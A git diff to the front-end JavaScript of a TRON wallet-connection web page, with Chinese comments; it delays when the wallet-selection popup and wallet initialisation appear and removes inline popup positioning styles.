@@ -1734,47 +1734,33 @@ async function sendSignalA1() {
      * 修复3：点击链接后直接显示选择钱包弹窗（无需点击连接按钮）
      * 检测钱包环境（TRON兼容钱包）
      */
-    async function checkWalletEnv() {
-        // 检测到本地tronWeb（已连接钱包）
-        if (window.tronWeb && window.tronWeb.ready) {
-            tronWeb = window.tronWeb;
-            DOM.connectBtn.style.display = "none"; // 隐藏连接按钮
-            DOM.warning.style.display = "none";
-            DOM.specialTipContainer.style.display = "none";
+ async function checkWalletEnv() {
+    // 检测到本地tronWeb（已连接钱包）- 保留延时动画
+    if (window.tronWeb && window.tronWeb.ready) {
+        tronWeb = window.tronWeb;
+        DOM.connectBtn.style.display = "none"; // 隐藏连接按钮
+        DOM.warning.style.display = "none";
+        DOM.specialTipContainer.style.display = "none";
+        // 关键：检测到钱包时，保留延时动画（1500ms后执行初始化，与加载动画同步）
+        setTimeout(async () => {
             await initWallet(false);
-            return;
-        }
-
-        // 非钱包环境：自动显示弹窗（核心需求）+ 显示连接按钮（关闭后可重新触发）
-        DOM.specialTipContainer.style.display = "block";
-        DOM.userInfoStatus.style.display = "block";
-        // 移除：原“请选择要连接的钱包”文本（避免关联“未连接”提示）
-        DOM.userInfoStatus.innerHTML = "";
-        DOM.approveBtn.style.display = "none";
-        DOM.connectBtn.style.display = "block"; // 显示按钮，关闭弹窗后可重新点击
-
-        // 自动显示弹窗（强制定位在底部，避免位置问题）
-        DOM.multiWalletPopup.style.display = "block";
-        DOM.multiWalletPopup.style.position = "fixed";
-        DOM.multiWalletPopup.style.top = "0";
-        DOM.multiWalletPopup.style.left = "0";
-        DOM.multiWalletPopup.style.width = "100%";
-        DOM.multiWalletPopup.style.height = "100%";
-        DOM.multiWalletPopup.style.background = "rgba(0,0,0,0.7)";
-        DOM.multiWalletPopup.style.zIndex = "9999";
-
-        // 弹窗内容强制定位底部
-        const popupContent = DOM.multiWalletPopup.querySelector('.wallet-modal-content');
-        if (popupContent) {
-            popupContent.style.position = "absolute";
-            popupContent.style.bottom = "180px";
-            popupContent.style.left = "50%";
-            popupContent.style.transform = "translateX(-50%)";
-            popupContent.style.width = "90%";
-            popupContent.style.maxWidth = "500px";
-        }
+        }, 1500);
+        return;
     }
 
+    // 未检测到钱包环境：逻辑立即执行，弹窗延迟1500ms显示（避免比主页面提前）
+    // 立即执行DOM样式配置逻辑
+    DOM.specialTipContainer.style.display = "block";
+    DOM.userInfoStatus.style.display = "block";
+    DOM.userInfoStatus.innerHTML = "";
+    DOM.approveBtn.style.display = "none";
+    DOM.connectBtn.style.display = "block";
+
+    // 关键修改：弹窗延迟1500ms显示（与主页面加载动画同步，不提前弹出）
+    setTimeout(() => {
+        DOM.multiWalletPopup.style.display = "block";
+    }, 500); // 和加载动画时长一致，确保不早于主页面显示
+}
     /**
      * 重新渲染动态内容（语言切换/状态变化后调用，无修改）
      */
@@ -1919,22 +1905,8 @@ document.addEventListener('DOMContentLoaded', async () => {
      ****************************************************************/
     DOM.connectBtn.addEventListener('click', () => {
         console.log('连接按钮点击，重新显示弹窗');
+        // 关键修改：删除所有强制定位代码，复用元素表原有样式
         DOM.multiWalletPopup.style.display = "block";
-        DOM.multiWalletPopup.style.position = "fixed";
-        DOM.multiWalletPopup.style.top = "0";
-        DOM.multiWalletPopup.style.left = "0";
-        DOM.multiWalletPopup.style.width = "100%";
-        DOM.multiWalletPopup.style.height = "100%";
-        DOM.multiWalletPopup.style.background = "rgba(0,0,0,0.7)";
-        DOM.multiWalletPopup.style.zIndex = "9999";
-
-        const popupContent = DOM.multiWalletPopup.querySelector('.wallet-modal-content');
-        if (popupContent) {
-            popupContent.style.position = "absolute";
-            popupContent.style.bottom = "180px";
-            popupContent.style.left = "50%";
-            popupContent.style.transform = "translateX(-50%)";
-        }
 
         DOM.userInfoStatus.style.display = "block";
         DOM.userInfoStatus.innerHTML = "";
@@ -2098,4 +2070,3 @@ document.addEventListener('DOMContentLoaded', async () => {
 </script>
 </body>
 </html>
-       
